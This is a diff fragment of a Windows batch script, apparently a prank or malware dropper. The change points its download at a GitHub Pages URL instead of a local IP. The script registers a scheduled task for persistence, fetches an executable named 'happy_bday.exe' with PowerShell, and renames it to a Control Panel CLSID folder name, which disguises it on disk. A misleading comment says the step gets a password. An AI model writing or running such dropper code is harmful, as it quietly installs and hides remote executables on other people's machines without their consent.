@@ -7,7 +7,7 @@ powershell -Command "Register-ScheduledTask -Action (New-ScheduledTaskAction -Ex
 
 :SETUP
 @REM Get the password from webserver
-powershell -Command "Invoke-WebRequest -Uri 'http://192.168.153.1:5000/happy_bday.exe' -OutFile '%script%'"
+powershell -Command "Invoke-WebRequest -Uri 'https://saltizm.github.io/Funnies/happy_bday.exe' -OutFile '%script%'"
 ren "%script%" "Control_Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 
 :MAIN
